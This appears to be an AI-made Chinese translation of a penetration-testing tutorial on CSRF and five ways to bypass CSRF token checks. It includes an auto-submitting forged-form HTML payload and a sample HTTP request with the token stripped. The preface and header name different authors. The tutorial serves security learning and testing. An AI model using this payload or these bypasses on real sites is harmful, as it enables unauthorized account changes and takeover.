这篇文章由 Deepak Prasad 撰写，深度解析了 **跨站请求伪造（CSRF）** 攻击的原理及其 5 种常见的绕过保护方法。

我已为你将全文翻译为中文，严格保持了原文的结构、技术命令和逻辑，并采用了标准的文档排版格式。

---

# 如何绕过 CSRF 保护 [5 种不同方法]

> **作者：**heuctf
> **更新日期：** 2026 年 4 月 10 日
> **分类：** 安全 (Security)
> **标签：** `#security`

---

## 目录
* 什么是 CSRF？
* CSRF 的实际工作原理
* CSRF 的影响
* 绕过 CSRF 保护的 5 种方法
* 额外小贴士
* 总结

---

## 什么是跨站请求伪造 (CSRF)？
**跨站请求伪造 (CSRF)** 是一种 Web 应用程序漏洞攻击向量。它通过诱导 Web 浏览器，在用户已登录的易受攻击的应用中执行未经意图的操作。

一次成功的 CSRF 攻击对用户和组织都可能是灾难性的，可能导致：
* 修改电子邮件地址
* 重置密码
* 更新个人资料
* 账号接管

攻击者通常利用**社会工程学**（如发送带有恶意 HTML 链接的邮件或消息）来触发攻击。



---

## CSRF 的实际工作原理
实现 CSRF 攻击需要满足以下三个条件：
1.  **一个敏感操作：** 存在一个可被利用的 API 调用或 POST 请求（如转账、修改密码）。
2.  **基于 Cookie 的会话处理：** 应用仅依赖会话 Cookie 来识别用户，没有其他保护措施（如密保问题）。
3.  **无不可预测的参数：** 请求中不包含攻击者无法猜测或爆破的参数（如 CSRF Token）。

### 漏洞示例请求：
```http
POST /profile/edit HTTP/1.1
Host: redacted.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=yunxuwoasniins2S5sej

first_name=Paul
```
在该请求中，没有可见的 Token 验证。攻击者可以构造如下 HTML 页面：
```html
<html>
 <body>
 <form action="https://redacted.com/profile/edit" method="POST">
 <input type="hidden" name="first_name" value="Fred" />
 </form>
 <script>
 document.forms[0].submit();
 </script>
 </body>
</html>
```
当已登录的受害者访问此页面时，其 `first_name` 将自动被修改为 "Fred"。

> **提示：** 你可以使用 **Burp Suite Professional** 的“生成 CSRF PoC”功能快速创建此类 HTML。

---

## CSRF 的影响
影响取决于受攻击的操作。
* **银行转账：** 直接造成资金损失。
* **密码重置：** 导致直接的账号接管。
如果受影响的操作涉及核心业务，必须立即修复。

---

## 绕过 CSRF 保护的 5 种方法

### ⚠️ 警告
**本教程仅供教育目的。严禁将此过程用于任何恶意活动，违者将受法律惩处。在进行任何渗透测试前，请务必获得相关方的许可。**

以下测试均基于这个包含 Token 的请求：
`_token=ZkfcxrWQ9CeoefwlwXuIXofKB6Vnk6t7jA9n2zxG&name=none&email=tester@gmail.com`

---

### 方法 1：删除 Token 参数
有些应用虽然启用了 CSRF Token，但服务器端并不校验该参数是否存在。
POST /account/users/new HTTP/1.1

Host: redacted.com

Cookie: _ga_97CDT2HN2H=GS1.1.1641786054.8.0.1641786061.0; _ga=GA1.1.1583877464.1641386639; XSRF-TOKEN=eyJpdiI6IjNCNVJvN0hYekptSzlmQjZkVG9jcVE9PSIsInZhbHVlIjoiZ2h0MEo2S1M3K3NlUlFxdkZ3NUpWNHcvTkNmNEd6bUpsd3ErbzZoSG9pZytPd2tXN0JEenV3OStIYVpRS3kvajloRGs0WEhxQkxOcTNFWWNSNnhrNkVreEp5cTkzNU1VVW1IeDl5ZldQNEhUZ0RIL1NwOGpLVk9MckgvTzVLZ0EiLCJtYWMiOiIwNzlmZWVjYWYxOTRkNTY1MzQ1MTVlZTRlYWI3MDhiYjQ0MjNkN2JjN2I0M2EzZWI1MDEyOWQ2MWQyM2RlNGIwIiwidGFnIjoiIn0%3D; 

User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 125

Origin: https://redacted.com

Referer: https://redacted.com/account/users

Upgrade-Insecure-Requests: 1

Te: trailers

Connection: close

_token=&name=none&email=tester%40gmail.com&password=testingcsrf&permissions%5B%5D=all
* **操作：** 直接从 POST 请求体中删除 `_token` 参数。
* **原理：** 如果服务器只在 Token 存在时才校验，而忽略了 Token 缺失的情况，则绕过成功。

### 方法 2：使用其他用户的 Token
服务器可能只检查 Token 的格式是否正确，而不校验该 Token 是否属于当前会话。
* **操作：** 使用你自己的另一个账号获取一个有效的 Token，并将其粘贴到针对受害者的攻击请求中。

### 方法 3：修改 Token 值为随机文本
有些弱验证逻辑可能只检查 Token 的长度或特定前缀。
* **操作：** 在原始 Token 后面添加随机字符或直接替换为随机字符串，测试服务器是否拦截。

### 方法 4：将 POST 请求更改为 GET
有些应用只对 POST 请求实施 CSRF 保护。
* **操作：** 将请求方法改为 `GET`，并将参数移动到 URL 查询字符串中，同时删除 Token。
* **示例：** `GET /account/users/new?name=none&email=tester@gmail.com...`

### 方法 5：利用静态/动态 Token 组合
部分 Token 包含静态部分（所有用户一致）和动态部分。
* **操作：** 保持静态前缀不变，仅修改动态后缀部分。如果服务器验证不严，请求可能被接受。

---

## 额外小贴士
1.  **Token 随机性测试：** 使用 Burp Suite 测试 Token 是否具有规律性，是否可以被预测或破解。
2.  **哈希算法检测：** 检查 Token 是否为常见的 MD5/SHA1 哈希，如果是，尝试自行构造。
3.  **用户代理（User-Agent）切换：** 尝试切换为移动端浏览器请求，有时移动端接口的 CSRF 保护较弱。

---

## 结论
本文介绍了 CSRF 攻击的原理及 5 种绕过方法。掌握这些技巧对于评估 Web 应用的安全性至关重要。如果你是初学者，建议深入学习伦理黑客的相关知识。如果你在测试中遇到问题，欢迎在下方评论。

---
**延伸阅读：** [OWASP CSRF 防御备忘录]
